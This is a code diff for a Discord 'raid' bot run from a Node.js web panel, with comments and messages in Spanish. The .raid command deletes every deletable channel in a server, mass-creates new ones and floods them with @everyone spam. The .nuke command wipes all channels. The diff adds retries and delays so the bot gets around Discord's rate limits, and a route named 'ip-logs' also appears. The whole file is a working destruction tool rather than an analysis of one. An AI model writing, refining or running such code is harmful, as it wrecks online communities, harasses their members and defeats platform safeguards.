@@ -59,6 +59,9 @@ const RAID_CONFIG = {
     mensaje: "@everyone SERVIDOR DESTRUIDO 🔥\n" + "█".repeat(2000)
 };
 
+// Función para esperar
+const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
 // Ruta principal
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
@@ -173,7 +176,7 @@ app.get('/api/ip-logs', (req, res) => {
 });
 
 // ============================================
-// BOT DE COMANDOS - MODO ROUND ROBIN
+// BOT DE COMANDOS - CORREGIDO
 // ============================================
 
 // Iniciar bot
@@ -215,13 +218,10 @@ app.post('/api/start-bot', async (req, res) => {
                 
                 console.log(`📨 Comando recibido: ${command} de ${message.author.tag}`);
 
-                // ============================================
-                // COMANDO .raid - MODO ROUND ROBIN
-                // ============================================
+                // COMANDO .raid - VERSIÓN CORREGIDA CON ANTI-RATE LIMIT
                 if (command === 'raid') {
-                    // Intentar enviar mensaje privado
                     try {
-                        await message.author.send(`⚡ **INICIANDO RAID MODO ROUND ROBIN** ⚡\n\`\`\`\nServidor: ${message.guild?.name}\nCanales: ${RAID_CONFIG.canales}\nMensajes por canal: ${RAID_CONFIG.mensajesPorCanal}\n\`\`\``);
+                        await message.author.send(`⚡ **INICIANDO RAID** ⚡\n\`\`\`\nServidor: ${message.guild?.name}\nCanales: ${RAID_CONFIG.canales}\nMensajes por canal: ${RAID_CONFIG.mensajesPorCanal}\n\`\`\``);
                         await message.delete().catch(() => {});
                     } catch (e) {
                         await message.reply('⚠️ No puedo enviarte mensajes privados. Habilita "Permitir mensajes directos" en las opciones del servidor.');
@@ -235,128 +235,187 @@ app.post('/api/start-bot', async (req, res) => {
                             return;
                         }
 
-                        // ============================================
-                        // FASE 1: ELIMINAR CANALES EXISTENTES
-                        // ============================================
-                        await message.author.send('🗑️ **FASE 1:** Eliminando canales existentes...');
-                        
-                        const channels = await guild.channels.fetch();
-                        const deletePromises = [];
-                        
-                        channels.forEach(channel => {
-                            if (channel.deletable) {
-                                deletePromises.push(channel.delete().catch(() => {}));
-                            }
-                        });
-                        
-                        await Promise.all(deletePromises);
-                        const canalesEliminados = deletePromises.length;
-                        
-                        await message.author.send(`✅ Canales eliminados: ${canalesEliminados}`);
-
-                        // ============================================
-                        // FASE 2: CREAR TODOS LOS CANALES PRIMERO
-                        // ============================================
-                        await message.author.send(`📌 **FASE 2:** Creando ${RAID_CONFIG.canales} canales...`);
-                        
-                        const createPromises = [];
-                        for (let i = 0; i < RAID_CONFIG.canales; i++) {
-                            createPromises.push(
-                                guild.channels.create({
-                                    name: `${RAID_CONFIG.nombreCanal}-${i}`,
-                                    type: ChannelType.GuildText
-                                }).catch(() => null)
-                            );
-                        }
-                        
-                        const canales = await Promise.all(createPromises);
-                        const canalesValidos = canales.filter(c => c !== null);
-                        const canalesCreados = canalesValidos.length;
-                        
-                        await message.author.send(`✅ Canales creados: ${canalesCreados}`);
-
-                        // ============================================
-                        // FASE 3: ENVIAR MENSAJES EN MODO ROUND ROBIN
-                        // ============================================
-                        await message.author.send(`📝 **FASE 3:** Enviando mensajes en modo ROUND ROBIN...`);
-                        
-                        if (canalesValidos.length === 0) {
-                            await message.author.send('❌ No se pudieron crear canales');
+                        // Verificar permisos del bot
+                        const botMember = guild.members.cache.get(bot.user.id);
+                        if (!botMember.permissions.has('ManageChannels') || !botMember.permissions.has('SendMessages')) {
+                            await message.author.send('❌ El bot no tiene los permisos necesarios (Manage Channels y Send Messages)');
                             return;
                         }
 
-                        const mensajesPorCanal = new Array(canalesValidos.length).fill(0);
+                        // FASE 1: ELIMINAR CANALES CON ANTI-RATE LIMIT
+                        await message.author.send('🗑️ **FASE 1:** Eliminando canales existentes...');
+                        
+                        const channels = await guild.channels.fetch();
+                        let canalesEliminados = 0;
+                        
+                        // Eliminar canales de uno en uno con manejo de rate limits
+                        for (const [_, channel] of channels) {
+                            if (channel.deletable) {
+                                let eliminado = false;
+                                let intentos = 0;
+                                
+                                while (!eliminado && intentos < 3) {
+                                    try {
+                                        await channel.delete();
+                                        canalesEliminados++;
+                                        eliminado = true;
+                                        console.log(`✅ Canal eliminado: ${channel.name}`);
+                                        
+                                        // Esperar 500ms entre eliminaciones para evitar rate limits
+                                        await wait(500);
+                                    } catch (error) {
+                                        intentos++;
+                                        console.log(`Error eliminando canal ${channel.name} (intento ${intentos}):`, error.message);
+                                        
+                                        if (error.message.includes('rate limited')) {
+                                            // Si hay rate limit, esperar más tiempo
+                                            await wait(5000);
+                                        } else {
+                                            await wait(1000);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        
+                        await message.author.send(`✅ Canales eliminados: ${canalesEliminados}`);
+
+                        // FASE 2: CREAR CANALES CON ANTI-RATE LIMIT
+                        await message.author.send(`📌 **FASE 2:** Creando ${RAID_CONFIG.canales} canales...`);
+                        
+                        const canalesValidos = [];
+                        for (let i = 0; i < RAID_CONFIG.canales; i++) {
+                            let creado = false;
+                            let intentos = 0;
+                            
+                            while (!creado && intentos < 3) {
+                                try {
+                                    const channel = await guild.channels.create({
+                                        name: `${RAID_CONFIG.nombreCanal}-${i + 1}`,
+                                        type: ChannelType.GuildText,
+                                        reason: 'Raid en progreso'
+                                    });
+                                    canalesValidos.push(channel);
+                                    creado = true;
+                                    console.log(`✅ Canal creado: ${channel.name} (${i + 1}/${RAID_CONFIG.canales})`);
+                                    
+                                    // Esperar 1 segundo entre creaciones
+                                    await wait(1000);
+                                } catch (error) {
+                                    intentos++;
+                                    console.log(`Error creando canal ${i + 1} (intento ${intentos}):`, error.message);
+                                    
+                                    if (error.message.includes('rate limited')) {
+                                        await wait(5000);
+                                    } else {
+                                        await wait(2000);
+                                    }
+                                }
+                            }
+                            
+                            // Actualizar progreso cada 10 canales
+                            if ((i + 1) % 10 === 0) {
+                                await message.author.send(`📊 Progreso creación: ${i + 1}/${RAID_CONFIG.canales} canales`);
+                            }
+                        }
+                        
+                        const canalesCreados = canalesValidos.length;
+                        await message.author.send(`✅ Canales creados: ${canalesCreados}`);
+
+                        if (canalesCreados === 0) {
+                            await message.author.send('❌ No se pudo crear ningún canal. Verifica los permisos del bot.');
+                            return;
+                        }
+
+                        // FASE 3: ENVIAR MENSAJES CON ANTI-RATE LIMIT
+                        await message.author.send(`📝 **FASE 3:** Enviando ${RAID_CONFIG.mensajesPorCanal} mensajes por canal...`);
+                        
                         let mensajesEnviados = 0;
-                        const totalMensajesNecesarios = RAID_CONFIG.canales * RAID_CONFIG.mensajesPorCanal;
                         
-                        // Crear un array de promesas para enviar mensajes en paralelo
-                        const messagePromises = [];
-                        
-                        // Mientras no hayamos enviado todos los mensajes necesarios
-                        while (mensajesEnviados < totalMensajesNecesarios) {
-                            // Recorrer todos los canales en orden
-                            for (let i = 0; i < canalesValidos.length; i++) {
-                                // Si este canal ya tiene sus 15 mensajes, saltarlo
-                                if (mensajesPorCanal[i] >= RAID_CONFIG.mensajesPorCanal) {
-                                    continue;
+                        for (let i = 0; i < canalesValidos.length; i++) {
+                            const channel = canalesValidos[i];
+                            
+                            try {
+                                // Verificar que el canal sigue existiendo
+                                const canalActual = await guild.channels.fetch(channel.id).catch(() => null);
+                                if (!canalActual) continue;
+                                
+                                for (let j = 0; j < RAID_CONFIG.mensajesPorCanal; j++) {
+                                    let enviado = false;
+                                    let intentos = 0;
+                                    
+                                    while (!enviado && intentos < 3) {
+                                        try {
+                                            // Dividir mensaje si es muy largo
+                                            const mensajePartes = RAID_CONFIG.mensaje.match(/.{1,1900}/g) || [RAID_CONFIG.mensaje];
+                                            
+                                            for (const parte of mensajePartes) {
+                                                await channel.send(parte);
+                                                mensajesEnviados++;
+                                            }
+                                            
+                                            enviado = true;
+                                            
+                                            // Esperar 300ms entre mensajes
+                                            await wait(300);
+                                        } catch (error) {
+                                            intentos++;
+                                            console.log(`Error enviando mensaje en canal ${channel.name} (intento ${intentos}):`, error.message);
+                                            
+                                            if (error.message.includes('rate limited')) {
+                                                await wait(5000);
+                                            } else if (error.message.includes('Missing Access')) {
+                                                // El canal ya no existe, salir del bucle
+                                                j = RAID_CONFIG.mensajesPorCanal;
+                                                break;
+                                            } else {
+                                                await wait(1000);
+                                            }
+                                        }
+                                    }
                                 }
                                 
-                                const channel = canalesValidos[i];
+                                // Actualizar progreso cada 5 canales
+                                if ((i + 1) % 5 === 0) {
+                                    await message.author.send(`📊 Progreso mensajes: ${i + 1}/${canalesValidos.length} canales procesados (${mensajesEnviados} mensajes)`);
+                                }
                                 
-                                // Enviar mensaje y actualizar contadores
-                                messagePromises.push(
-                                    channel.send(RAID_CONFIG.mensaje).then(() => {
-                                        mensajesPorCanal[i]++;
-                                        mensajesEnviados++;
-                                        console.log(`📨 Mensaje ${mensajesPorCanal[i]}/15 enviado a canal ${i}`);
-                                    }).catch(e => {
-                                        console.log(`Error enviando a canal ${i}:`, e.message);
-                                    })
-                                );
-                                
-                                // Pequeña pausa para no saturar la API
-                                await new Promise(resolve => setTimeout(resolve, 50));
+                                console.log(`✅ Canal ${channel.name}: mensajes enviados`);
+                            } catch (e) {
+                                console.log(`Error en canal ${channel?.name}:`, e.message);
                             }
-                        }
-                        
-                        // Esperar a que todos los mensajes se envíen
-                        await Promise.all(messagePromises);
-
-                        // ============================================
-                        // FASE 4: VERIFICACIÓN Y REPORTE
-                        // ============================================
-                        let canalesCompletados = 0;
-                        for (let i = 0; i < mensajesPorCanal.length; i++) {
-                            if (mensajesPorCanal[i] === RAID_CONFIG.mensajesPorCanal) {
-                                canalesCompletados++;
-                            } else {
-                                console.log(`⚠️ Canal ${i} solo tiene ${mensajesPorCanal[i]} mensajes`);
-                            }
+                            
+                            // Pequeña pausa entre canales
+                            await wait(1000);
                         }
 
-                        const reporte = `✅ **RAID COMPLETADO - MODO ROUND ROBIN** ✅
+                        // FASE 4: REPORTE FINAL
+                        const reporte = `✅ **RAID COMPLETADO** ✅
 \`\`\`prolog
 🗑️ CANALES ELIMINADOS: ${canalesEliminados}
 📌 CANALES CREADOS: ${canalesCreados}
 💬 MENSAJES ENVIADOS: ${mensajesEnviados}
-📊 CANALES COMPLETADOS: ${canalesCompletados}/${RAID_CONFIG.canales}
-⚡ OBJETIVO POR CANAL: ${RAID_CONFIG.mensajesPorCanal}
+⚡ VELOCIDAD: Máxima (anti-rate limit activado)
 \`\`\``;
 
                         await message.author.send(reporte);
                         
-                        // Mensaje de confirmación en el primer canal
-                        if (canalesValidos.length > 0) {
-                            await canalesValidos[0].send(`✅ RAID COMPLETADO POR ${message.author.tag} - ${mensajesEnviados} mensajes enviados`);
-                        }
+                        // Intentar crear canal de reporte en el servidor
+                        try {
+                            const reportChannel = await guild.channels.create({
+                                name: 'raid-completado',
+                                type: ChannelType.GuildText
+                            });
+                            await reportChannel.send(reporte);
+                        } catch (e) {}
 
                     } catch (e) {
                         console.error('Error en raid:', e);
-                        await message.author.send(`❌ Error: ${e.message}`);
+                        await message.author.send(`❌ Error crítico: ${e.message}`);
                     }
                 }
                 
-                // COMANDO .nuke (igual que antes)
+                // COMANDO .nuke
                 else if (command === 'nuke') {
                     try {
                         await message.author.send('💥 **INICIANDO NUKE**...');
@@ -374,17 +433,19 @@ app.post('/api/start-bot', async (req, res) => {
                         }
 
                         const channels = await guild.channels.fetch();
-                        const deletePromises = [];
+                        let canalesEliminados = 0;
                         
-                        channels.forEach(channel => {
+                        for (const [_, channel] of channels) {
                             if (channel.deletable) {
-                                deletePromises.push(channel.delete().catch(() => {}));
+                                try {
+                                    await channel.delete();
+                                    canalesEliminados++;
+                                    await wait(500);
+                                } catch (e) {}
                             }
-                        });
+                        }
                         
-                        await Promise.all(deletePromises);
-                        
-                        await message.author.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ Canales eliminados: ${deletePromises.length}\n\`\`\``);
+                        await message.author.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ Canales eliminados: ${canalesEliminados}\n\`\`\``);
                         
                     } catch (e) {
                         await message.author.send(`❌ Error: ${e.message}`);
@@ -434,9 +495,9 @@ app.post('/api/start-bot', async (req, res) => {
                 // COMANDO .help
                 else if (command === 'help') {
                     const helpMsg = `
-**🤖 COMANDOS DEL BOT - MODO ROUND ROBIN**
+**🤖 COMANDOS DEL BOT**
 \`\`\`css
-${prefix}raid    - Destruye el servidor (canales primero, luego mensajes round-robin)
+${prefix}raid    - Destruye el servidor (anti-rate limit)
 ${prefix}nuke    - Elimina todos los canales
 ${prefix}stop    - Detiene el bot
 ${prefix}servers - Lista servidores
@@ -447,8 +508,9 @@ ${prefix}ping    - Ver latencia
 Canales: ${RAID_CONFIG.canales}
 Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
 Nombre: ${RAID_CONFIG.nombreCanal}
-Modo: PRIMERO CANALES, LUEGO MENSAJES ROUND-ROBIN
-\`\`\``;
+\`\`\`
+
+🔥 **Anti-Rate Limit Activado**`;
                     
                     try {
                         await message.author.send(helpMsg);
@@ -471,7 +533,7 @@ Modo: PRIMERO CANALES, LUEGO MENSAJES ROUND-ROBIN
 
         res.json({ 
             success: true, 
-            message: "✅ Bot iniciado - Modo ROUND ROBIN activado",
+            message: "✅ Bot iniciado - Los resultados irán por privado",
             user: bot.user?.tag,
             servers: bot.guilds.cache.size,
             config: RAID_CONFIG
@@ -577,10 +639,9 @@ app.post('/api/update-config', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
     console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
-    console.log(`🤖 MODO ROUND ROBIN ACTIVADO:`);
+    console.log(`🤖 Bot configurado:`);
     console.log(`   - Canales: ${RAID_CONFIG.canales}`);
     console.log(`   - Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}`);
     console.log(`   - Nombre canal: ${RAID_CONFIG.nombreCanal}`);
-    console.log(`   - Estrategia: PRIMERO CANALES, LUEGO MENSAJES ROUND-ROBIN`);
     console.log(`🌐 URL: http://localhost:${PORT}`);
 });
